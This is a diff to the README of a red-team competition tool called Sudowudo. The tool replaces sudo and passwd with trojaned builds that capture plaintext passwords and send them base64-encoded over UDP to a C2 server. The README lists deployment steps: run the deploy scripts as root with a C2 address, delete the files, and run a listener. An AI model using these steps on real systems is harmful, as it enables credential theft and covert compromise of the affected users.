@@ -1,13 +1,18 @@
 # Sudowudo 
-## (And other various shims)
 
-This repository is home to a few binary shims used for red team competitions. These scripts and tools are not intended to be used anywhere outside of blue/red team competitions as it's essentially malware.
+Sudowudo is comprised of two binary shims: sudo, and passwd. These are intented for blue/red team competition use in order to exfiltrate plaintext passwords from the blue team. These shims are not inteded to be used for malicious purposes. 
 
-Sudowudo takes advantage of tgetpass.c by stealing and exfiltrating the plaintext password before it's used, and sending it to a C2 server via a UDP datagram.
+Passwords are encoded in base64 and sent over in a UDP datagram. The information from the sudo portion conveys which user ran sudo, while from the shadow/passwd portion it conveys which user's password is being set.
 
-To deploy the shim on a device, run deploy as root and provide the IP of the C2 server and it's port. This will clone the OS specific version of sudo, add the shim, and then build it using make.
+## Prerequisites
 
-`sudo ./deploy XXX.XXX.XXX.XXX 1337`
+These have both only been tested on Ubuntu 22.04 Jammy Jellyfin, and will most likely only work on that version.
+Root is required on any box that is going to have these shims deployed on them. The deploy scripts should install all required dependencies, but may take some tweaking.
 
-## Requirements
+## Usage
 
+1. Move `deploy-shadowudo`, `deploy-sudowudo`, and `sudowudo.c` to the target.
+2. Run `sudo ./deploy-shadowudo {C2 IP} {PORT}` and `sudo ./deploy-sudowudo {C2 IP} {PORT}`
+3. Remove all files
+4. Move `sudowudo-listener.py` to the C2 server/jumpbox and run it with your selected port
+5. Either monitor the python script itself, or run it with `screen -d -m python3 sudowudo-listener.py` to run it in the background and have another terminal window running `tail -f /var/log/sudowudo.log`
